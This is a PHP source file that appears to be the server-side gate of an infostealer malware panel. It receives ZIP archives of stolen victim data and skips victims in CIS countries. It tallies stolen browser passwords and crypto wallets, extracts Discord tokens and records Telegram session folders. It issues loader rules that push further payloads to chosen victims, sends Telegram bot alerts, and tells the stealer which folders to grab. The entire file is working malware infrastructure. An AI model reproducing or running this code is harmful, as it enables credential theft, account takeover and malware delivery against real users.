<?php
ini_set('post_max_size', '100M');
ini_set('upload_max_filesize', '100M');
// -------------------------------------------------------------------------
// db
require_once ('db.php');

// -------------------------------------------------------------------------
// Include geoip data
require($GLOBALS['panel_folder'].'/GeoIP/geoip.php');

$IP = $_SERVER["REMOTE_ADDR"];//$_SERVER["HTTP_X_REAL_IP"]; 
$Country = ip_code($IP) == "?" ? "UNK" : ip_code($IP);

switch ($Country)
{
	case "RU":
		exit(0);
		break;
	case "BY":
		exit(0);
		break;
	case "KZ":		
		exit(0);
		break;
	case "AZ":
		exit(0);
		break; 
	case "UZ":
		exit(0);
		break;
}

$DateAdded = date("Y-m-d H:i:s");

$FileName = $Country . "_" .$IP. "_" .$DateAdded. "_" .$_FILES['file']['name'];

$File = $GLOBALS['panel_folder'].'/'.$GLOBALS['logspath']."/".basename($FileName);

$Username = "";
$OS  = "";
$WorkingPath  = "";
$InstallDate  = "";

// -------------------------------------------------------------------------
// upload file to server
if (move_uploaded_file($_FILES['file']['tmp_name'], $File))
{

	$zip = new ZipArchive;
	
	if($_FILES['file']['size'] == 0)
	{
		exit(0);
	}

	// -------------------------------------------------------------------------
	// file successful load to server
	if ($zip->open(realpath($File)) === TRUE) 
	{
		// -------------------------------------------------------------------------  
		// user info
		$system = $zip->getFromName("system.txt");
		$sysinfo = explode("\n", $system);
		$_system = "";
		$MachineID = substr($sysinfo[23], 11);
		$tag = substr($sysinfo[0], 5);
		
		$Username = substr($sysinfo[21], 11);
		$OS = substr($sysinfo[16], 4);
		$WorkingPath = substr($sysinfo[5], 14);
		$InstallDate = substr($sysinfo[7], 12);
		
		foreach ($sysinfo as $key=>$str)
		{
			if ($key>3 and $key<25)
			{
				$_system .= $str."\n";
			}
		}
		
		 // -------------------------------------------------------------------------
		// dublicate check  
		$settings = R::load('settings', 1);  
		if($settings["dublicates"] == "0")
		{
		  if ((R::count( 'log', ' id_machine = ? ', [$MachineID] ))>0)
		  {
			unlink(realpath($File));
			exit(0);
		  }
		}

		// -------------------------------------------------------------------------
		// Add network info into system.txt
		$system = str_ireplace("IP?", $IP, $system);
		$system = str_ireplace("Country?", $Country, $system);
		
		$zip->addFromString('system.txt', $system);
			
		// -------------------------------------------------------------------------
		// Stats
		$passwords = $zip->getFromName("passwords.txt");
		$CountPass = substr_count($passwords, "SOFT:");
		$CountCrypto = 0;
		$CountPlugins = 0;
		$CountDiscord = 0;
		$CountTelegram = 0;	


		// -------------------------------------------------------------------------
		// top sites count
		$sites = explode("\n", $passwords);
		
		foreach($sites as $line)
		{
			$l = substr($line, 0, 6);
			
			if($l == "HOST: ")
			{
				$url = parse_url(substr($line, 6));
				
				$url_r = $url['host'];
				
				$site  = R::findOne( 'topsites', ' url = ? ', [ $url_r ] );
				if ($site != NULL)
				{
					$site->count_r = $site["count_r"]+1;
					R::store($site);
				}
				else
				{
					$site = R::dispense('topsites');
					$site->url = $url_r;
					$site->count_r = 1;
					R::store($site);
				}
			}
		}
		// -------------------------------------------------------------------------
		// chromium passwords count
		$CountChromium = substr_count($passwords, ": Google Chrome") +
			substr_count($passwords, ": Chrome") +
			substr_count($passwords, ": Chromium") +
			substr_count($passwords, ": Kometa") +
			substr_count($passwords, ": Amigo") +
			substr_count($passwords, ": Torch") +
			substr_count($passwords, ": Orbitum") +
			substr_count($passwords, ": Comodo Dragon") +
			substr_count($passwords, ": Nichrome") +
			substr_count($passwords, ": Maxthon5") +
			substr_count($passwords, ": Sputnik") +
			substr_count($passwords, ": EPB") +
			substr_count($passwords, ": Vivaldi") +
			substr_count($passwords, ": CocCoc Browser") +
			substr_count($passwords, ": Uran Browser") +
			substr_count($passwords, ": QIP Surf") +
			substr_count($passwords, ": Cent") +
			substr_count($passwords, ": Elements Browser") +
			substr_count($passwords, ": TorBrowser");
		
		// -------------------------------------------------------------------------
		// firefox passwords count
		$CountFirefox = substr_count($passwords, ": Mozilla Firefox") +
			substr_count($passwords, ": Pale Moon") +
			substr_count($passwords, ": Waterfox") +
			substr_count($passwords, ": Cyberfox") +
			substr_count($passwords, ": Black Hawk") +
			substr_count($passwords, ": IceCat") +
			substr_count($passwords, ": Firefox") +
			substr_count($passwords, ": K-Meleon");
		
		// -------------------------------------------------------------------------
		// other passwords count
		$CountIE = substr_count($passwords, ": Internet Explorer");
		$CountEdge = substr_count($passwords, ": Edge_Chromium");
		$CountOpera = substr_count($passwords, ": Opera");
		
		// -------------------------------------------------------------------------
		// add in db
		$temp = R::findOne('browsers', 'name = ?', ['Chromium']);
		$temp->count_c = $temp["count_c"]+$CountChromium;
		R::store($temp);
		
		$temp = R::findOne('browsers', 'name = ?', ['Firefox']);
		$temp->count_c = $temp["count_c"]+$CountFirefox;
		R::store($temp);
		
		$temp = R::findOne('browsers', 'name = ?', ['IE']);
		$temp->count_c = $temp["count_c"]+$CountIE;
		R::store($temp);
		
		$temp = R::findOne('browsers', 'name = ?', ['Edge']);
		$temp->count_c = $temp["count_c"]+$CountEdge;
		R::store($temp);
		
		$temp = R::findOne('browsers', 'name = ?', ['Opera']);
		$temp->count_c = $temp["count_c"]+$CountOpera;
		R::store($temp);
	
		// -------------------------------------------------------------------------
		// cc and crypto count
		$countFilesInLog = $zip->numFiles;
		
		for ($i = 0; $i < $countFilesInLog; $i++)
		{
			$stat = $zip->statIndex($i);
			$found = strripos($stat['name'], "Wallets/");
			
			if($found === false){}else
			{
				$CountCrypto++;
			}
		}
		
		// -------------------------------------------------------------------------
		// crypto plugins count
		$countFilesInLog = $zip->numFiles;
		
		for ($i = 0; $i < $countFilesInLog; $i++)
		{
			$stat = $zip->statIndex($i);
			$found = strripos($stat['name'], "Plugins/");
			
			if($found === false){}else
			{
				$CountPlugins++;
			}
		}
		
		// -------------------------------------------------------------------------
		// search discord token
		$tokens = "";
		
		if ($settings["grab_discord"] == "1")
		{
			$countFilesInLog = $zip->numFiles;
			
			for ($i = 0; $i < $countFilesInLog; $i++)
			{
				$stat = $zip->statIndex($i);
				$found = strripos($stat['name'], "Discord/");
						
				if($found === false){}else
				{
					$discord = $zip->getFromName($stat['name']);
					preg_match('/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/i', $discord, $matches);
					foreach ($matches as $match)
					{
						$CountDiscord++;
						$tokens .= $match."\n";
					}
				}
			}
			
			if ($tokens != "")
			{
				$zip->addFromString('Discord_Tokens.txt', $tokens);
			}
		}
		
		// -------------------------------------------------------------------------
		// search telegram 
		if ($settings["grab_telegram"] == "1")
		{
			$countFilesInLog = $zip->numFiles;
			
			for ($i = 0; $i < $countFilesInLog; $i++)
			{
				$stat = $zip->statIndex($i);
				$found = strripos($stat['name'], "Telegram/");					
				if($found === false){}else
				{
					$CountTelegram++;
				}
			}
		}
		
		// -------------------------------------------------------------------------
		// dublicate check
		
		$dublicate = 0;
		
		if ((R::count( 'log', ' id_machine = ? ', [$MachineID] ))>0)
		{
			$dublicate++;
		}
		
		// -------------------------------------------------------------------------
		// Add log info in db		
		$passwords = mb_convert_encoding($passwords,"UTF-8");
		$system = mb_convert_encoding($system,"UTF-8");
		
		$log = R::dispense('log');
		
		$log->id_machine = $MachineID;
		$log->count_pwds = $CountPass;
		$log->ip = $IP;
		$log->country = $Country;
		$log->add_date = $DateAdded;
		$log->count_crpt = $CountCrypto;
		$log->count_plugins = $CountPlugins;
		$log->count_discord = $CountDiscord;
		$log->count_telegram = $CountTelegram;
		$log->path = $FileName;
		$log->dublicate = $dublicate;
		$log->tag = $tag;
		R::store($log);
		
		$_log = R::findOne('log','add_date LIKE ? AND id_machine LIKE ? ', [$DateAdded,$MachineID]);
		
		$_log->text_pwds = $passwords;
		$_log->text_sys  = $system;
		
		R::store($_log);
		
		if($Country != "UNK")
		{
		  $stat_country = R::findOne ('statistics_countries', ' code = ? ', [$Country]);
		  $stat_country->count_c = $stat_country["count_c"]+1;
		  R::store($stat_country);
		}
		
		// -------------------------------------------------------------------------
		// generate loader request link|load_to|startup_param|
		
		$request_string = "";		
		$rules = R::findAll('loader');
		
		foreach ($rules as $rule)
		{
			$stat = 0;
			if($rule['is_active'] == "1")
			{
				if($rule['cold_wallets'] == "0" || ($rule['cold_wallets'] == "1" && $CountCrypto != "0"))
				{

						$_pwds = explode(',', $rule["pwds"]);
						foreach ($_pwds as $_pwd)
						{
							if(strpos($passwords, $_pwd))
							{
								$stat = 1;
							}
						}
						if($rule['pwds'] == "")
						{
							$stat = 1;
						}
						if ($stat == 1)
						{
							$request_string .= $rule['file_path']."|";
							$request_string .= $rule['load_to']."|";
							if ($rule['startup_param'] == "")
							{
								$request_string .= " |";
							}
							else 
							{
								$request_string .= $rule['startup_param']."|";
							}
						}

				}
			}
		}

			
		
		
		echo base64_encode($request_string);
		
		// -------------------------------------------------------------------------
		// Tg bot send message		
		if($settings["bot_enable"] == "1")
		{
			$markers = R::find('markerrule', 'is_active = ?', ["1"]);
			
			$goodMarkers;		

			foreach (array_reverse($markers, true) as $marker) {
				$_markers = explode(',', $marker["marker"]);
				foreach ($_markers as $_marker)
				{
					$pos = stripos($passwords, $_marker);

					if ($pos !== false) 
					{
						$goodMarkers .= $_marker." ";
					}
				}
			}
			
			$photo = "http://" . $GLOBALS['domain'] . "/" . $GLOBALS['panel_folder'] . "/view.php?path=" . $GLOBALS['logspath'] . "/" . $FileName . "";
			$link = "http://" . $GLOBALS['domain'] . "/" . $File;
			if ($dublicate == "1")
			{
				$dublicate = "yes";
			}
			else
			{
				$dublicate = "no";
			}
			
			$telegram_text = '
IP: <b>'.$IP.'</b>
Country: <b>'.$Country.'</b>

Passwords: <b>'.$CountPass.'</b>
Crypto: <b>'.$CountCrypto.'</b>
Plugins: <b>'.$CountPlugins.'</b>
Discord: <b>' . $CountDiscord . '</b>
Telegram: <b>' . $CountTelegram . '</b>
Markers: <b><code>'.  $goodMarkers .'</code></b>

Dublicate: <b>'.$dublicate.'</b>

Username: <b>'. $Username .'</b>
OS: <b>'. $OS .'</b>

Path: <b>'. $WorkingPath .'</b>

Archive: <a>'. $link .'</a>

Date: <b>'. $InstallDate .'</b>
';
			$url = "https://api.telegram.org/bot"  .$settings["bot_token"] . "/sendPhoto";

			if($settings["bot_scr"] == "1")
			{			
				$photo = "http://" . $GLOBALS['domain'] . "/" . $GLOBALS['panel_folder'] . "/view.php?path=" . $GLOBALS['logspath'] . "/" . $FileName . "";
				$url = "https://api.telegram.org/bot"  .$settings["bot_token"] . "/sendPhoto";
				$post_fields = array
				(
					'chat_id'   => $settings["chatid"],
					'disable_web_page_preview' => false,
					'caption'	=> $telegram_text,
					'parse_mode' => 'HTML',
					'photo' => $photo
				);	
			}
			else
			{			
				$url = "https://api.telegram.org/bot"  .$settings["bot_token"] . "/sendMessage";
				$post_fields = array
				(
					'chat_id'   => $settings["chatid"],
					'disable_web_page_preview' => false,
					'text'	=> $telegram_text,
					'parse_mode' => 'HTML',
				);
			}	


			$ch = curl_init(); 
			curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
			curl_setopt($ch, CURLOPT_URL, $url); 
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
			$output = curl_exec($ch);
		}	
	}
	
	$zip->close();
	
	// -------------------------------------------------------------------------
}
else
{
	// -------------------------------------------------------------------------
		// generate grab request name|max_size|path|formats|exceptions|recursively|
		$settings = R::load('settings', 1); 
		
		$request_string = "";	
		$request_string .= $settings['grab_downloads']."|";
		$request_string .= $settings['grab_history']."|";
		$request_string .= $settings['grab_autofill']."|";
		$request_string .= $settings['grab_screenshot']."|";
		$request_string .= $settings['selfdelete']."|";
		$rules = R::findAll('grabrule');
		if ($settings['grab_discord'] == '1')
		{
			$request_string .= "Discord"."|";
			$request_string .= "0"."|";
			$request_string .= "%APPDATA%\\discord\\Local Storage\\"."|";
			$request_string .= "*"."|";
			$request_string .= "1"."|";
			$request_string .= "0"."|";
			$request_string .= "0"."|";
		}
		if ($settings['grab_telegram'] == '1')
		{
			$request_string .= "Telegram"."|";
			$request_string .= "0"."|";
			$request_string .= "%APPDATA%\\Telegram Desktop\\tdata\\"."|";
			$request_string .= "*D877F783D5D3EF8C*,*map*,*configs*"."|";
			$request_string .= "1"."|";
			$request_string .= "0"."|";
			$request_string .= "0"."|";
		}
		foreach ($rules as $rule)
		{
			if ($rule['is_active'] == '1')
			{			
				$request_string .= $rule['name']."|";
				$request_string .= $rule['max_size']."|";
				$request_string .= $rule['path']."|";
				$request_string .= $rule['formats']."|";
				$request_string .= $rule['recursively']."|";
				$request_string .= $rule['compress']."|";
				$request_string .= $rule['blacklist']."|";
			}					
		}
		echo base64_encode($request_string);
		
}

?>